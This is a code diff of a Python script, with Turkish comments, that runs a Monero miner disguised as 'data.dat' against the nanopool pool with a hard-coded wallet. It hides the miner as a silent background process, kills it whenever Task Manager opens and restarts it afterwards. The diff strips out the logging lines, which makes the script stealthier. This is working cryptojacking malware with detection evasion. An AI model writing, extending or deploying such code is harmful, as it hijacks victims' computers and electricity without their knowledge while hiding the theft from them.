@@ -20,12 +20,9 @@ def start():
 def kill():
     for process in psutil.process_iter(attrs=['pid', 'name']):
         if process.info['name'].lower() == 'data.dat':
-            print(f"Process {process.info['name']} ({process.info['pid']}) bulundu. Durduruluyor...")
             process.terminate()  # Programı sonlandır
             process.wait()  # Sonlanmasını bekle
-            print("data.dat başarıyla durduruldu.")
             return True
-    print("data.dat bulunamadı.")
     return False
 
 
@@ -46,7 +43,6 @@ def is_task_manager_open():
 def task_manager_watcher():
     while True:
         if is_task_manager_open():
-            print("Görev Yöneticisi Açıldı!")
             kill()
         elif not ifapp():
             subprocess.Popen(f"cmd.exe /c start /B {data} -o xmr-eu1.nanopool.org:10300 -u 46yEzJmwGanCo29RsAQXGsSPtpD9kikjRFiabDDLWsEYYop5HfcbvChKGihnNYmAct3jaNf8siSVydxQuDvCxkVY52SJwLv -p x", shell=True,stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
